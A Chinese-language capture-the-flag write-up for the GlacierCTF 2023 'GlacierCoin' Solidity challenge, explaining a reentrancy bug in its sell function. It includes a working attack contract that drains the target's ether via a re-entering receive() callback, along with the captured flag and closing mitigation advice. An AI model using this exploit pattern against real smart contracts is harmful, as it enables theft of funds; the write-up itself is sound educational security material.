# GlacierCTF2023 - GlacierCoin

## 题目简述

`GlacierCoin` 按 `msg.value` 一比一铸造内部余额，`sell(amount)` 将相同数量的 ether 退给调用者。`Setup` 预先向目标存入 10 ether，解题条件是把目标余额清零。

## 解题过程

`sell` 在外部调用之后才更新余额：

```solidity
uint256 newBalance = balances[msg.sender] - amount;
(msg.sender).call{value: amount}("");
balances[msg.sender] = newBalance;
```

攻击合约投入 10 ether 买入 10 ether 计价的代币，使目标合约总余额达到 20 ether。第一次 `sell(10 ether)` 触发攻击合约的 `receive()`；此时内部余额尚未扣减，回调可以再次 `sell(10 ether)`，两次转账正好抽干 20 ether。

```solidity
function attack() external payable {
    require(msg.value == 10 ether);
    target.buy{value: 10 ether}();
    target.sell(10 ether);
}

receive() external payable {
    if (address(target).balance != 0) {
        target.sell(10 ether);
    }
}
```

两层调用返回后虽然都会把攻击者账面余额写成零，但 ether 已经转出，`isSolved()` 成立：

```text
gctf{Glac13r_cO1n_i5_g0Ing_t0_th3_m0on_4nd_b3y0nd}
```

## 方法总结

这是典型重入：检查成立后先与不可信调用者交互，状态效果延迟到回调之后。应采用 Checks-Effects-Interactions，先扣余额再转账，并在可重入入口增加互斥保护；不能因为最终会写回余额就认为中间状态不可利用。
